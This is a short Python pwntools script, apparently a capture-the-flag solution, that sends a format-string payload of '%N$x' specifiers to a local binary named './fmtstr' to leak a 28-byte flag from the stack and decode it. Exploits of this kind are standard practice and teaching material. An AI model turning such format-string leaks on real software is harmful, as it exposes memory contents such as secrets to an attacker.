#! /usr/bin/python
# -*- coding: utf-8 -*-
# By : howpwn
# Email : finn79426@gmail.com

from pwn import *

r = process("./fmtstr")

FLAGLEN = 28 # Source code char array length


flag = ""
payload = ""
for i in range(12, (12+FLAGLEN/4)):
    payload += "%{}$x.".format(i)

print payload
r.sendline(payload)

##########################################3

recv = r.recvall().split(".")
r.close()

for i in recv:
    flag +=i.decode("hex")[::-1]

print flag
